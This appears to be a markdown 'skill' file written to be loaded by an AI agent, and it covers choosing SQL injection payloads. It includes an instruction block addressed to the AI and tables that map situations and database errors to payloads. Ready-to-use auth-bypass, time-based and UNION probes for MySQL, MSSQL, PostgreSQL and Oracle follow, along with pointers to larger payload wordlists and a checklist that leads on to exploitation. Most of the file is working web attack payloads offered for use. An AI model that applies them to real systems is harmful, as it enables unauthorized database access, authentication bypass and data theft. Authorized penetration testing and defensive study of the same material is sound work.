# SKILL: SQLi Payload Selection — DBMS, Technique, and Fuzzing Index

> **AI LOAD INSTRUCTION**: Use this skill when SQL injection is plausible and you need a compact payload selection strategy instead of a raw payload dump. Pick payload families by DBMS behavior, context, and signal quality.

## 1. WHEN TO LOAD THIS SKILL

Load this skill when:

- Input lands in SQL-shaped filters, ordering, search, reporting, or login logic
- You need to choose a first-pass payload family for verification
- You want to pivot from generic SQLi suspicion to DBMS-specific testing

For deeper exploitation, also load:

- `skills/injection-checking/SQLi_SQL_Injection.skill.md`
- `skills/api-sec/API_Authorization_and_BOLA.skill.md` when the sink is an API object filter

## 2. PAYLOAD FAMILY SELECTION

| Situation | Start With | Why |
|---|---|---|
| Login or boolean branch | `' or 1=1--` | Fast signal on auth or conditional checks |
| Numeric parameter | `1 or 1=1` | Avoid quote dependency |
| ORDER BY / sorting | `1,2,3` then `1 desc--` | Good for structural probing |
| Visible SQL errors | `'` then DBMS-specific error probes | Error text gives DBMS clues |
| No visible output | time-based payloads | Stable fallback for blind targets |
| Heavy filtering / WAF | polyglot or whitespace-free variants | Expands parser confusion surface |

## 3. SMALL, STABLE FIRST-PASS PAYLOADS

### Generic boolean and syntax

```text
'
' or 1=1--
' or '1'='1'--
1 or 1=1
') or ('1'='1
```

### Time-based by common DBMS

```text
'; WAITFOR DELAY '0:0:5'--
' AND SLEEP(5)--
'||(SELECT pg_sleep(5))--
1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)
```

### UNION / column discovery hints

```text
' order by 1--
' order by 2--
' union select null--
' union select null,null--
```

## 4. DBMS-SPECIFIC ROUTING

| Clue | Likely DBMS | Good Next Move |
|---|---|---|
| `You have an error in your SQL syntax` | MySQL | try `SLEEP()` and `@@version` |
| `Microsoft OLE DB Provider` | MSSQL | try `WAITFOR DELAY` |
| `PG::` / `PostgreSQL` | PostgreSQL | try `pg_sleep()` |
| `ORA-` prefix | Oracle | pivot to out-of-band or XML features |
| SQLite errors, local apps | SQLite | focus on boolean/UNION and file-backed behavior |

## 5. FUZZING WORDLIST STRATEGY

Use small dictionaries first:

- auth bypass payloads
- boolean blind payloads
- time-based payloads
- polyglot / WAF mutation payloads
- parameter names like `sort`, `order`, `filter`, `direction`, `column`

Do not inline giant payload sets. Prefer external references grouped by family:

- Web-Fuzzing-Box: `Vuln/Sql_Injection/Sql_Payload.txt`, `Sql_Params.txt`
- PayloadsAllTheThings: `SQL Injection/Intruder/`

## 6. QUICK CHECKLIST

1. Decide string or numeric context.
2. Trigger one syntax or boolean signal.
3. Identify likely DBMS from errors or response timing.
4. Move to the right family: boolean, UNION, error, time-based, or OOB.
5. Once confirmed, switch to the full SQLi skill for exploitation depth.